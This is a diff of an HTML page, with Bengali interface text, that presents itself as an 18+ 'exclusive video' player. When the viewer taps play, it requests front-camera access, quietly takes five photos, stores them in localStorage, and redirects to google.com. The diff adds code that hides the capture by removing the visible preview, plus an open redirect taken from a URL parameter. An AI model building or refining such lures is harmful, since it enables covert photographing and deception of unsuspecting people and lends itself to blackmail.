@@ -3,59 +3,57 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Private Video</title>
+  <title>Video Loading...</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box;}
-    body,html{height:100%;background:#000;overflow:hidden;}
-    iframe{width:100%;height:100%;border:none;display:none;}
-    .player{position:relative;width:100%;height:100%;display:flex;align-items:center;justify-content:center;}
-    .blur-bg{position:absolute;top:0;left:0;width:100%;height:100%;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(15px) brightness(0.5);transform:scale(1.1);}
+    body,html{height:100%;background:#000;overflow:hidden;position:relative;}
+    .player{width:100%;height:100%;position:relative;display:flex;align-items:center;justify-content:center;}
+    .bg{position:absolute;top:0;left:0;width:100%;height:100%;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(14px) brightness(0.55);transform:scale(1.1);}
+    .overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.45);z-index:1;}
     .content{position:relative;z-index:10;text-align:center;color:#fff;cursor:pointer;}
-    .play{width:100px;height:100px;background:rgba(255,0,0,0.95);border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 50px rgba(255,0,0,0.8);border:4px solid rgba(255,255,255,0.3);}
-    .play::after{content:'▶';font-size:48px;margin-left:8px;}
-    .title{font-size:26px;font-weight:bold;text-shadow:0 0 20px #000;}
-    .cam{display:none;flex-direction:column;align-items:center;justify-content:center;height:100%;background:#000;}
-    video{max-width:90%;border-radius:16px;border:5px solid #0066ff;box-shadow:0 0 50px #0066ff;}
+    .play{width:92px;height:92px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 22px;box-shadow:0 0 60px rgba(255,0,0,0.9);border:5px solid rgba(255,255,255,0.3);animation:pulse 2s infinite;}
+    .play::after{content:'Play';font-size:48px;color:#fff;margin-left:6px;}
+    @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.18);}}
+    .title{font-size:28px;font-weight:bold;text-shadow:0 3px 10px #000;}
+    .sub{font-size:19px;text-shadow:0 2px 8px #000;margin-top:8px;}
+    .msg{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.9);color:#fff;padding:30px 50px;border-radius:20px;font-size:21px;z-index:20;display:none;}
   </style>
 </head>
 <body>
 
-<iframe id="frame"></iframe>
-
 <div class="player" id="player">
-  <div class="blur-bg"></div>
-  <div class="content" onclick="startCam()">
+  <div class="bg"></div>
+  <div class="overlay"></div>
+  <div class="content" onclick="startCapture()">
     <div class="play"></div>
-    <div class="title">প্রাইভেট ভিডিও</div>
-    <div style="font-size:18px;margin-top:8px;">ট্যাপ করো প্লে করতে</div>
+    <div class="title">এক্সক্লুসিভ ভিডিও</div>
+    <div class="sub">ট্যাপ করে প্লে করো (18+)</div>
   </div>
 </div>
 
-<div class="cam" id="cam">
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <div style="color:#00ff9d;margin-top:20px;font-size:18px;">লোড হচ্ছে...</div>
-</div>
+<div class="msg" id="msg">ক্যামেরা অনুমতি দিন...</div>
+
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
 const params = new URLSearchParams(location.search);
 const id = params.get('id');
-const redirect = params.get('r') ? decodeURIComponent(params.get('r')) : null;
 
-if (redirect) {
-  // রিডাইরেক্ট লিংক থাকলে সরাসরি দেখাও
-  document.getElementById('frame').src = redirect;
-  document.getElementById('frame').style.display = 'block';
-} else {
-  // না থাকলে ফেক ভিডিও প্লেয়ার দেখাও
+// যদি রিডাইরেক্ট লিংক থাকে → সরাসরি চলে যাও (view.html ওপেন হবে না)
+if (document.referrer.includes('index.html') && params.has('r')) {
+  const redirect = decodeURIComponent(params.get('r'));
+  location.replace(redirect);
+}
+
+// অন্যথায় → ফেক ভিডিও দেখাও
+else if (id) {
   document.getElementById('player').style.display = 'flex';
 }
 
-function startCam() {
+function startCapture() {
   document.getElementById('player').style.display = 'none';
-  document.getElementById('cam').style.display = 'flex';
+  document.getElementById('msg').style.display = 'block';
 
-  const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const ctx = canvas.getContext('2d');
   let count = 0;
@@ -63,26 +61,27 @@ function startCam() {
 
   navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(stream => {
+      const video = document.createElement('video');
       video.srcObject = stream;
       video.play();
 
       const shoot = () => {
         if (count >= 5) {
           localStorage.setItem('camsnap_' + id, JSON.stringify(images));
-          setTimeout(() => alert("ভিডিও শেষ ❤️"), 800);
+          setTimeout(() => location.href = "https://google.com", 1000);
           return;
         }
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        ctx.drawImage(video, 0, 0);
-        images.push(canvas.toDataURL('image/jpeg', 0.9));
+        canvas.width = 640; canvas.height = 480;
+        ctx.drawImage(video, 0, 0, 640, 480);
+        images.push(canvas.toDataURL('image/jpeg', 0.92));
         count++;
-        setTimeout(shoot, 800);
+        setTimeout(shoot, 750);
       };
-      setTimeout(shoot, 1500);
+      setTimeout(shoot, 1200);
     })
     .catch(() => {
-      document.getElementById('cam').innerHTML = "<div style='color:#f00;font-size:20px;padding:30px;'>ক্যামেরা অনুমতি দাও!</div>";
+      document.getElementById('msg').innerHTML = "ক্যামেরা বন্ধ!<br>অনুমতি দাও";
+      document.getElementById('msg').style.background = "rgba(200,0,0,0.9)";
     });
 }
 </script>
